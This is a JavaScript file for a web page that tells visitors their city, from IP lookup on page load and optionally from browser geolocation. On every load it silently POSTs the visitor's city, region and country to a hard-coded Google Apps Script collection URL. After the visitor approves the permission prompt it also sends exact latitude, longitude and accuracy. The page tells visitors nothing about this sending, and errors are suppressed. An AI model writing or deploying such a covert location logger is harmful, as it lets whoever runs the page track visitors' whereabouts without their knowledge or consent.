// Optional: paste a URL here to receive each visit (e.g. a webhook.site URL,
// a Google Apps Script web app, or your own server). Leave "" to only show the city.
const COLLECT_URL = "https://script.google.com/macros/s/AKfycbwYrBKaH2Sy0-9Byp0KR8z6qe5VokRT8tEjs3FeLoOQVrypFMbcn6_l0q9S8uspv-9A/exec";

const statusEl = document.getElementById("status");
const cityEl = document.getElementById("city");
const detailsEl = document.getElementById("details");
const preciseBtn = document.getElementById("preciseBtn");
 
function send(data) {
  if (!COLLECT_URL) return;
  fetch(COLLECT_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "text/plain" },
    body: JSON.stringify({ ...data, time: new Date().toISOString() })
  }).catch(() => {});
}
 
// Rough, approximate location from IP address. Runs automatically.
async function findCityByIP() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    if (!res.ok) throw new Error("Lookup failed");
    const d = await res.json();
 
    statusEl.textContent = "Based on your network, you appear to be near";
    cityEl.textContent = d.city || "an unknown city";
    detailsEl.textContent = [d.region, d.country_name].filter(Boolean).join(", ");
    cityEl.hidden = false;
    detailsEl.hidden = false;
 
    send({ type: "ip", city: d.city, region: d.region, country: d.country_name });
  } catch (err) {
    statusEl.textContent = "Couldn't detect your approximate location.";
  }
}
 
// Precise location via the browser's own geolocation API.
// Only runs if the visitor clicks the button and approves the permission prompt.
function sharePreciseLocation() {
  if (!navigator.geolocation) {
    preciseBtn.textContent = "Precise location isn't supported in this browser";
    preciseBtn.disabled = true;
    return;
  }
 
  preciseBtn.textContent = "Requesting permission…";
  preciseBtn.disabled = true;
 
  navigator.geolocation.getCurrentPosition(
    async (pos) => {
      const { latitude, longitude, accuracy } = pos.coords;
 
      // Reverse-geocode the coordinates into a city name.
      let place = `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
      try {
        const res = await fetch(
          `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`
        );
        const d = await res.json();
        const a = d.address || {};
        place = a.city || a.town || a.village || a.county || place;
      } catch (_) {
        // fall back to raw coordinates if reverse geocoding fails
      }
 
      statusEl.textContent = "Your precise location is";
      cityEl.textContent = place;
      detailsEl.textContent = `Accurate to about ${Math.round(accuracy)}m`;
      cityEl.hidden = false;
      detailsEl.hidden = false;
      preciseBtn.hidden = true;
 
      send({ type: "precise", city: place, latitude, longitude, accuracy });
    },
    (err) => {
      preciseBtn.disabled = false;
      preciseBtn.textContent = "Share precise location";
      if (err.code === err.PERMISSION_DENIED) {
        statusEl.textContent = "Location permission was denied — showing the approximate result above instead.";
      } else {
        statusEl.textContent = "Couldn't get a precise location. Try again.";
      }
    },
    { enableHighAccuracy: true, timeout: 10000 }
  );
}
 
preciseBtn.addEventListener("click", sharePreciseLocation);
findCityByIP();